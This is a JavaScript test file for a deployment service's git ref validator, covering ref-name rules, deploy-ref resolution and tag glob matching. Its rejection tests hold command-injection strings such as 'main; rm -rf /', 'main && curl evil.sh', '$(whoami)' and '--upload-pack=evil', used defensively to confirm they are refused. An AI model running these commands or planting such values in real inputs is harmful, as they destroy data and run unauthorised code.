import assert from "node:assert/strict";
import test from "node:test";

import {
  isValidGitRefName,
  isVersionPinned,
  matchesTagPattern,
  resolveDeployRef,
  tagPatternToRegExp,
} from "../../src/server/services/git-ref";

test("ordinary branch and tag names are accepted", () => {
  for (const ref of [
    "main",
    "develop",
    "v1.2.3",
    "release/2026-08",
    "feature/login-form",
    "v1.0.0-rc.1",
    "a",
  ]) {
    assert.equal(isValidGitRefName(ref), true, ref);
  }
});

test("anything that could escape a shell argument is rejected", () => {
  for (const ref of [
    "main; rm -rf /",
    "main && curl evil.sh",
    "main | tee x",
    "$(whoami)",
    "`id`",
    "main\nmain",
    "main main",
    'main"',
    "main'",
    "main$X",
    "main>out",
    "--upload-pack=evil",
  ]) {
    assert.equal(isValidGitRefName(ref), false, ref);
  }
});

test("refs that git itself would reject are rejected", () => {
  for (const ref of [
    "",
    "   ",
    "/leading",
    "trailing/",
    ".leading",
    "trailing.",
    "has..dots",
    "double//slash",
    "ends.lock",
    "-starts-with-dash",
    "x".repeat(129),
  ]) {
    assert.equal(isValidGitRefName(ref), false, JSON.stringify(ref));
  }
});

test("a pinned tag wins over the branch", () => {
  assert.deepEqual(resolveDeployRef({ repoBranch: "main", repoTag: "v1.1.0" }), {
    ref: "v1.1.0",
    kind: "tag",
  });
});

test("the branch is used when no tag is pinned", () => {
  assert.deepEqual(resolveDeployRef({ repoBranch: "main", repoTag: null }), {
    ref: "main",
    kind: "branch",
  });
  assert.deepEqual(resolveDeployRef({ repoBranch: "main", repoTag: "  " }), {
    ref: "main",
    kind: "branch",
  });
});

test("an override beats both, which is how a tag push deploys itself", () => {
  assert.deepEqual(
    resolveDeployRef({ repoBranch: "main", repoTag: "v1.0.0" }, "v2.0.0"),
    { ref: "v2.0.0", kind: "tag" },
  );
});

test("an unsafe override is dropped instead of forwarded", () => {
  assert.deepEqual(
    resolveDeployRef({ repoBranch: "main", repoTag: null }, "v1; rm -rf /"),
    { ref: "main", kind: "branch" },
  );
});

test("an unsafe stored value is dropped too", () => {
  assert.deepEqual(
    resolveDeployRef({ repoBranch: "main", repoTag: "bad tag" }),
    { ref: "main", kind: "branch" },
  );
  assert.deepEqual(resolveDeployRef({ repoBranch: "bad branch" }), {
    ref: undefined,
    kind: "default",
  });
});

test("no configured ref falls back to the repository default", () => {
  assert.deepEqual(resolveDeployRef({}), { ref: undefined, kind: "default" });
});

test("version pinning reflects a usable tag only", () => {
  assert.equal(isVersionPinned({ repoTag: "v1.0.0" }), true);
  assert.equal(isVersionPinned({ repoTag: "" }), false);
  assert.equal(isVersionPinned({ repoTag: null }), false);
  assert.equal(isVersionPinned({ repoTag: "bad tag" }), false);
});

test("a glob matches the tags it should and no others", () => {
  assert.equal(matchesTagPattern("v1.2.3", "v*"), true);
  assert.equal(matchesTagPattern("v1.2.3", "v1.*"), true);
  assert.equal(matchesTagPattern("beta-1", "v*"), false);
  assert.equal(matchesTagPattern("v1", "v?"), true);
  assert.equal(matchesTagPattern("v12", "v?"), false);
  assert.equal(matchesTagPattern("v1.2.3", "*"), true);
});

test("a wildcard does not cross a path separator", () => {
  assert.equal(matchesTagPattern("release/v1", "release/*"), true);
  assert.equal(matchesTagPattern("release/v1", "*"), false);
});

test("an empty pattern never matches, so tag pushes stay opt-in", () => {
  for (const pattern of ["", "   ", null, undefined]) {
    assert.equal(matchesTagPattern("v1.2.3", pattern), false);
  }
});

test("an unsafe tag never matches, even against a permissive pattern", () => {
  assert.equal(matchesTagPattern("v1; rm -rf /", "*"), false);
  assert.equal(matchesTagPattern("$(id)", "*"), false);
});

test("pattern characters are matched literally, not as regex", () => {
  // A dot must not behave as "any character".
  assert.equal(matchesTagPattern("v1.2.3", "v1.2.3"), true);
  assert.equal(matchesTagPattern("v1x2x3", "v1.2.3"), false);
  // A pattern cannot smuggle in an alternation or anchor.
  assert.equal(tagPatternToRegExp("v1|v2").test("v1"), false);
  assert.equal(tagPatternToRegExp("v1").test("xv1x"), false);
});
